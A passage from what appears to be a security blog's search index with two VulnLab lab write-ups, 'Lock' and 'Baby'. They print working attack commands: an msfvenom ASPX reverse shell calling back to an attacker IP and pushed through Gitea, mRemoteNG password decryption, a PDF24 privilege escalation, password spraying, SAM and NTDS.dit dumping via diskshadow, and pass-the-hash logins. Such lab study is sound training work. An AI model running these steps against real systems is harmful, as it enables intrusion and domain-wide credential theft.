class="line">        <span class="keyword">return</span> response.json()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&#x27;Failed to retrieve repositories: <span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;gitea_domain&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    gitea_domain = format_domain(sys.argv[<span class="number">1</span>])</span><br><span class="line">    personal_access_token = <span class="string">&#x27;TOKEN&#x27;</span>  <span class="comment"># Use the provided token directly</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> personal_access_token:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: GITEA_ACCESS_TOKEN environment variable not set.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        repos = get_repositories(personal_access_token, gitea_domain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Repositories:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> repo <span class="keyword">in</span> repos:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;- <span class="subst">&#123;repo[<span class="string">&#x27;full_name&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>we will get back the 2 repos she has made</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Repositories:</span><br><span class="line">- ellen.freeman/dev-scripts</span><br><span class="line">- ellen.freeman/website</span><br></pre></td></tr></table></figure><p>After cloning the website repo with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Readme-helpfull.png" alt="Image discritpion"><br>we see in the readme.md that any change we make on the repo it will reflect on the actual website so now we can create a .aspx shell and place it on the website.</p><p>Generating a shell with msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><p>And before we push our changes to the repo we need to setup git:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name ellen.freeman</span><br><span class="line">git config --global user.email ellen.freeman@lock.vl</span><br></pre></td></tr></table></figure><p>Inside the repo we will add the new file, commit it and push it to the repo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add shell.aspx</span><br><span class="line">git commit -m &quot;shell&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>Then we start our listener and curl the wesbite for the shell to trigger:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nlvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://lock.vl/shell.aspx</span><br></pre></td></tr></table></figure><p><code>Sometimes it takes a couple of minutes untill the pipeline builds the changes we did on the repository, do not do multiple pushes to the repo as it restarts the process</code></p><p><img src="/images/Lock/Shell-as-Elen.png" alt="Image discritpion"></p><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><h3 id="Ellen-Freeman-to-Gale-Dekarios"><a href="#Ellen-Freeman-to-Gale-Dekarios" class="headerlink" title="Ellen.Freeman to Gale.Dekarios"></a>Ellen.Freeman to Gale.Dekarios</h3><p>Inside the <code>Directory of c:\Users\ellen.freeman\Documents</code> there is a <code>config.xml </code><br>taking a look into the xml we can see that its a file for Multi-Remote Next Generation Connection Manager <a href="https://mremoteng.org/">https://mremoteng.org/</a> . With a google search we can find a github repo that decripts the password that on the <code>config.xml</code></p><p><a href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gquere/mRemoteNG_password_decrypt</span><br><span class="line">cd mRemoteNG_password_decrypt-master</span><br><span class="line">python3 mremoteng_decrypt.py ../config.xml</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-PAss.png" alt="Image discritpion"></p><p>Using xfreerdp we will establish an rdp session with the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.78.85 /u:Gale.Dekarios /p:</span><br></pre></td></tr></table></figure><h3 id="PDF24-CVE-2023-49147"><a href="#PDF24-CVE-2023-49147" class="headerlink" title="PDF24 - CVE-2023-49147"></a>PDF24 - CVE-2023-49147</h3><p>After getting into the rdp session we can grab the user flag and see that there is a program called PDF24 after a simple google search we can see that there is a privilege escalation exploit for it <a href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a></p><p>First we need to locate the msi installer, after some digging around (dont forget to look for hidden folders)</p><p><img src="/images/Lock/MSI-file.png" alt="Image discritpion"></p><p>Now we need to <code>SetOpLock.exe</code> to the machine, as we have rdp we can just copy paste it.</p><p>We will open two terminals in one of them we will lock the log file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetOpLock.exe &quot;C:\Program Files\PDF24\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure><p>And then we will patch the PDF24 app</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-exploits.png" alt="Image discritpion"></p><p>After you let it load you can follow the github instructions to get a shell:</p><ul><li>right click on the top bar of the cmd window</li><li>click on properties</li><li>under options click on the “Legacyconsolemode” link</li><li>open the link with a browser other than internet explorer or edge (both don’t open as SYSTEM when on Win11)</li><li>in the opened browser window press the key combination CTRL+o</li><li>type cmd.exe in the top bar and press Enter</li></ul><p><a href="https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464">https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Baby</title>
      <link href="/2025/03/08/VL-Baby/"/>
      <url>/2025/03/08/VL-Baby/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-VulnLab-Baby-Windows-Active-Directory-Privilege-Escalation-via-SeBackupPrivilege-and-NTDS-dit-Extraction"><a href="#HTB-VulnLab-Baby-Windows-Active-Directory-Privilege-Escalation-via-SeBackupPrivilege-and-NTDS-dit-Extraction" class="headerlink" title="HTB-VulnLab Baby: Windows Active Directory Privilege Escalation via SeBackupPrivilege and NTDS.dit Extraction"></a>HTB-VulnLab Baby: Windows Active Directory Privilege Escalation via SeBackupPrivilege and NTDS.dit Extraction</h1><p>This comprehensive Hack The Box&#x2F;VulnLab penetration testing walkthrough demonstrates a complete Active Directory domain compromise through systematic enumeration and privilege escalation techniques. Starting with network reconnaissance using Nmap that identified a Windows Domain Controller running multiple AD services, I leveraged anonymous LDAP access to discover an initial password (BabyStart123!) embedded in a user’s description field.</p><p>Through targeted password spraying and credential validation, I identified a user account requiring password change, successfully authenticating as Caroline.Robinson using SMB password reset functionality. The critical breakthrough came from exploiting the SeBackupPrivilege assigned to the compromised user account, which allowed extraction of sensitive Windows registry hives (SAM and SYSTEM) for local hash dumping.</p><p>However, the real escalation required advanced techniques including Volume Shadow Copy creation via DiskShadow to extract the NTDS.dit file - the crown jewel containing all domain password hashes. This technical walkthrough showcases essential Active Directory penetration testing methodologies including LDAP enumeration, privilege abuse, registry manipulation, and domain controller compromise techniques crucial for Windows domain security assessments and red team operations.</p><h2 id="Namap-Scan"><a href="#Namap-Scan" class="headerlink" title="Namap Scan"></a>Namap Scan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65514 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-06 14:47:47Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-05T14:31:02</span><br><span class="line">| Not valid after:  2025-09-04T14:31:02</span><br><span class="line">| MD5:   48f2:c223:e5c4:356d:b768:8571:f1c6:8950</span><br><span class="line">| SHA-1: 03fd:ff73:d5e1:92bd:32bf:d747:c3fb:bb46:ff4e:6d2d</span><br><span class="line">|_ssl-date: 2025-03-06T14:49:20+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   DNS_Tree_Name: baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-06T14:48:39+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55620/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">59532/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 29424/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 15632/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 18953/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 41352/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-03-06T14:48:41</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="FOOTHOLD"><a href="#FOOTHOLD" class="headerlink" title="FOOTHOLD"></a>FOOTHOLD</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>After some enumeration we found that ldap had null session active.</p><p><img src="/images/Baby/LDAP-ACCESS-NULL.png" alt="LDAP Access Null"></p><p>After running a query on the hole ldap with the below command we found that one user had a description field with a initial password <code>BabyStart123!</code>. We will try to use that password for the user teresa.bell and if it doesn’t work we will spray it to the rest of the users</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Teresa Bell, it, baby.vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: Teresa Bell</span><br><span class="line">sn: Bell</span><br><span class="line">description: Set initial password to BabyStart123!</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/LDAP-DISCR-PASSWORD.png" alt="LDAP Password Description"></p><p>The creds we found for Teresa.Bell but they dont work, so we will gather all of the users and password spray. We gathered the account names threw the below search BUT it was not the correct way:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;(objectClass=user)&quot; sAMAccountName -LLL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Getting-all-users.png" alt="Getting All Users"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Jacqueline.Barnett</span><br><span class="line">Ashley.Webb</span><br><span class="line">Hugh.George</span><br><span class="line">Leonard.Dyer</span><br><span class="line">Connor.Wilkinson</span><br><span class="line">Joseph.Hughes</span><br><span class="line">Kerry.Wilson</span><br><span class="line">Teresa.Bell</span><br></pre></td></tr></table></figure><p>We tried the usernames we gathered but it didnt work in any of them, we tried a more broad ldap search and another user popped up &#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;user&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Hit-on-account(passchange).png" alt="Hit on Account Password Change"></p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>The flag <code>STATUS_PASSWORD_MUST_CHANGE</code> tells us that we first need to change the password before we are able to log in to that user. Using the <code>smbpasswd</code> tool we were able to change Carolines password to <code>Password123!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 10.10.114.53 -U &#x27;Caroline.Robinson&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Password_Change_Car.png" alt="Password Change Caroline"><br><img src="/images/Baby/netexec-after-pass-change.png" alt="Netexec After Password Change"></p><p>We can check if we have winrm access using the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm 10.10.114.53 -u Caroline.Robinson  -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Winrm-access.png" alt="WinRM Access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Caroline.Robinson -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>The user we got has the SeBackupPrivilege flag anabled.</p><p><img src="/images/Baby/sebackupriv.png" alt="SeBackupPrivilege"></p><p>Now we can copy the sam and system hive of HKLM and crack them lockaly.</p><p>Create a temp directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\temp</span><br></pre></td></tr></table></figure><p>Copy the sam and system hive of HKLM to C:\temp and then download them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\temp\sam.hive</span><br></pre></td></tr></table></figure><p>and</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\temp\system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Save-huve.png" alt="Save Hive"></p><p>Go on the temp folder and download the system and the sam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download sam.hive</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>Finally use impacket-secretsdump and obtain the ntlm hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Cracked-admin-ash.png" alt="Cracked Admin Hash"></p><p>Now we can login using evil-winrm and get the root flag<br><img src="/images/Baby/Not-working.png" alt="Not Working Local Admin Hash"></p><h3 id="NTDS-DIT"><a href="#NTDS-DIT" class="headerlink" title="NTDS.DIT"></a>NTDS.DIT</h3><p>We can see that we cannon log into the machine as the hash we got is for the local administrator. We have to get the hash of the account in the domain (which has exactly the same name). In order to do this, we have to grab “ntds.dit” aswell.</p><p>Using this script to copy the ntds.dit (xct script)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># save this in script.txt</span><br><span class="line">set metadata C:\Windows\Temp\meta.cabX</span><br><span class="line">set context clientaccessibleX</span><br><span class="line">set context persistentX</span><br><span class="line">begin backupX</span><br><span class="line">add volume C: alias cdriveX</span><br><span class="line">createX</span><br><span class="line">expose %cdrive% E:X</span><br><span class="line">end backupX</span><br></pre></td></tr></table></figure><p>Then we will run the below commands to get the ntds.dit from the “snapshot” we made</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># run diskshadow</span><br><span class="line">diskshadow /s script.txt</span><br><span class="line"># copy ntds to c</span><br><span class="line">robocopy /b E:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure><p>After downloading the <code>ntds.dit</code> to our local machine and run secretsdump again</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Got-admin-hash.png" alt="Got Admin Hash from NTDS"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92">https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
            <tag> HTB </tag>
            
            <tag> Foo </tag>
            
            <tag> Bar </tag>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
